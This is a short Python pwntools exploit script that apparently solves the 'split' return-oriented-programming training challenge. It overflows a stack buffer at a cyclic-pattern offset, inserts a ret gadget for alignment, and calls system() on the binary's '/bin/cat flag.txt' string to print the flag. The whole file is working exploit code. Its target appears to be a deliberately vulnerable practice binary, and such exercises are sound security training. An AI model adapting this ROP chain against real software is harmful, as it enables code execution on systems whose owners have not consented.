#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./split")
FLAG = next(elf.search(b"/bin/cat flag.txt\x00"))

rop = ROP(elf)
rop.raw(b"A" * cyclic_find(0x6161616161616166, n=8))
rop.raw(p64(rop.ret.address))
rop.call('system', [p64(FLAG)])

log.info(rop.dump())

p = elf.process()
p.sendline(rop.chain())
log.success(p.recvall().decode().strip())
